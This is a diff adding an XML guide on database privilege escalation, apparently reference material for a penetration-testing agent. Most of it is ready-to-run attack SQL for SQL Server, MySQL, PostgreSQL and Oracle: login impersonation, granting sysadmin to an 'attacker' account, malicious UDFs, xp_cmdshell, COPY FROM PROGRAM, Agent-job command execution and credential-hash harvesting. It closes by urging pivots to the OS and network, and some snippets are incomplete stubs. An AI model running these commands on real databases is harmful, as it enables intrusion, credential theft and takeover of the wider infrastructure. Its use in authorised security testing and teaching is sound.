@@ -1,0 +1,236 @@
+<vulnerability_guide>
+  <title>DATABASE PRIVILEGE ESCALATION</title>
+
+  <critical>Database privilege escalation moves from limited database access to DBA or OS-level control. Default configurations, stored procedure abuse, and permission inheritance provide escalation paths. Database compromise often leads to full infrastructure compromise through linked servers, credential harvesting, and OS command execution.</critical>
+
+  <scope>
+    - Role and permission escalation
+    - Privilege inheritance exploitation
+    - Default credential abuse
+    - Trusted procedure exploitation
+    - Cross-database escalation
+    - Database to OS escalation
+  </scope>
+
+  <methodology>
+    1. PERMISSION ENUMERATION
+       {% raw %}
+       # SQL Server permissions
+       SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+       SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
+       SELECT * FROM sys.server_principals;
+       SELECT * FROM sys.database_principals;
+
+       # MySQL permissions
+       SHOW GRANTS FOR CURRENT_USER();
+       SELECT * FROM mysql.user;
+       SELECT * FROM information_schema.user_privileges;
+
+       # PostgreSQL permissions
+       SELECT * FROM pg_roles;
+       \du  -- List users and roles
+       SELECT * FROM information_schema.table_privileges;
+
+       # Oracle permissions
+       SELECT * FROM USER_SYS_PRIVS;
+       SELECT * FROM USER_ROLE_PRIVS;
+       SELECT * FROM DBA_SYS_PRIVS;
+       {% endraw %}
+
+    2. SQL SERVER ESCALATION
+       {% raw %}
+       # Impersonation
+       SELECT SYSTEM_USER;  # Current login
+       EXECUTE AS LOGIN = 'sa';
+       SELECT SYSTEM_USER;  # Now sa
+
+       # Check who can be impersonated
+       SELECT * FROM sys.server_permissions WHERE type = 'IM';
+
+       # Trustworthy database abuse
+       SELECT name, is_trustworthy_on FROM sys.databases;
+       -- If dbo of trustworthy DB, can escalate
+
+       # db_owner to sysadmin
+       -- If db_owner of trustworthy DB:
+       EXECUTE AS LOGIN = 'dbo';
+       EXEC sp_addsrvrolemember 'attacker', 'sysadmin';
+
+       # Linked server abuse
+       SELECT * FROM sys.servers;
+       EXEC sp_linkedservers;
+       EXEC ('SELECT SYSTEM_USER') AT [LinkedServer];
+       {% endraw %}
+
+    3. MYSQL ESCALATION
+       {% raw %}
+       # Check for FILE privilege
+       SELECT user, file_priv FROM mysql.user;
+
+       # User Defined Functions (UDF)
+       # With FILE privilege, create malicious UDF
+       CREATE TABLE foo(line blob);
+       INSERT INTO foo VALUES(LOAD_FILE('/tmp/lib_mysqludf.so'));
+       SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+       CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
+       SELECT sys_exec('id');
+
+       # Security definer procedures
+       SELECT DEFINER FROM information_schema.routines;
+       -- If DEFINER is root, procedure runs as root
+       {% endraw %}
+
+    4. POSTGRESQL ESCALATION
+       {% raw %}
+       # Check superuser status
+       SELECT usename, usesuper FROM pg_user;
+
+       # Large object abuse
+       SELECT lo_import('/etc/passwd');
+       SELECT lo_get(oid_number);
+
+       # Copy command (superuser)
+       COPY (SELECT 'malicious') TO '/var/lib/postgresql/.bashrc';
+
+       # PL/pgSQL trusted languages
+       CREATE OR REPLACE FUNCTION exec(cmd text)
+       RETURNS text AS $$
+       BEGIN
+           RETURN (SELECT cmd);  # Limited, but starting point
+       END;
+       $$ LANGUAGE plpgsql;
+
+       # pg_execute_server_program (PostgreSQL 11+)
+       COPY table FROM PROGRAM 'id';
+       {% endraw %}
+
+    5. ORACLE ESCALATION
+       {% raw %}
+       # Check DBA role
+       SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTEE = USER;
+
+       # Java execution (if enabled)
+       CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
+       import java.io.*;
+       public class cmd {
+           public static String run(String cmd) {
+               // Execute OS command
+           }
+       };
+
+       # DBMS_SCHEDULER abuse
+       DBMS_SCHEDULER.CREATE_JOB(
+           job_name => 'EXEC_CMD',
+           job_action => '/bin/bash -c "command"',
+           ...
+       );
+
+       # PL/SQL injection in privileged procedures
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <cross_database_escalation>
+      {% raw %}
+      # Pivot between databases
+
+      # SQL Server linked servers
+      SELECT * FROM OPENROWSET(
+          'SQLOLEDB', 'server=linked;trusted_connection=yes',
+          'SELECT * FROM master..syslogins'
+      );
+
+      # PostgreSQL dblink
+      SELECT * FROM dblink(
+          'host=other_server dbname=target',
+          'SELECT * FROM sensitive_table'
+      ) AS t1(data text);
+
+      # Oracle database links
+      SELECT * FROM table@dblink;
+      {% endraw %}
+    </cross_database_escalation>
+
+    <stored_procedure_escalation>
+      {% raw %}
+      # Abuse stored procedures
+
+      # SQL Server - xp_cmdshell
+      EXEC sp_configure 'xp_cmdshell', 1;
+      RECONFIGURE;
+      EXEC xp_cmdshell 'whoami';
+
+      # Oracle - DBMS_XMLGEN
+      SELECT DBMS_XMLGEN.GETXML('SELECT * FROM DBA_USERS') FROM DUAL;
+
+      # MySQL - stored procedure with DEFINER
+      -- If proc is DEFINER = 'root'@'localhost'
+      CALL privileged_procedure();
+      {% endraw %}
+    </stored_procedure_escalation>
+
+    <credential_harvesting>
+      {% raw %}
+      # Extract database credentials
+
+      # SQL Server - linked server passwords
+      SELECT * FROM sys.linked_logins;
+      -- Decrypt using service account context
+
+      # MySQL - user table
+      SELECT user, authentication_string FROM mysql.user;
+
+      # PostgreSQL - password file
+      -- Access ~/.pgpass if readable
+
+      # Application database credentials
+      SELECT * FROM configuration WHERE key LIKE '%password%';
+      {% endraw %}
+    </credential_harvesting>
+
+    <agent_job_abuse>
+      {% raw %}
+      # SQL Server Agent jobs
+
+      # Create job running as agent service account
+      USE msdb;
+      EXEC sp_add_job @job_name = 'malicious_job';
+      EXEC sp_add_jobstep @job_name = 'malicious_job',
+           @step_name = 'step1',
+           @subsystem = 'CmdExec',
+           @command = 'whoami > C:\output.txt';
+      EXEC sp_add_jobserver @job_name = 'malicious_job';
+      EXEC sp_start_job @job_name = 'malicious_job';
+
+      # Agent typically runs as high-privilege account
+      {% endraw %}
+    </agent_job_abuse>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor privilege grants and role changes
+    - Alert on impersonation context switches
+    - Track cross-database queries
+    - Audit stored procedure creation
+    - Monitor for suspicious job creation
+  </detection>
+
+  <validation>
+    - Enumerate current permissions
+    - Identify escalation paths
+    - Successfully escalate privileges
+    - Demonstrate OS command execution
+    - Document credential exposure
+  </validation>
+
+  <pro_tips>
+    - db_owner in SQL Server trustworthy DB = sysadmin
+    - Linked servers often have cached high-priv credentials
+    - MYSQL FILE privilege allows reading/writing files
+    - PostgreSQL COPY TO PROGRAM is command execution
+    - Oracle Java can execute OS commands if enabled
+    - Always check for impersonation permissions
+  </pro_tips>
+
+  <remember>Databases are rarely isolated - they connect to other systems, run as service accounts, and store credentials. Privilege escalation within the database is often just the first step. From DBA, pursue linked servers, agent jobs, and file system access to reach the operating system and network.</remember>
+</vulnerability_guide>
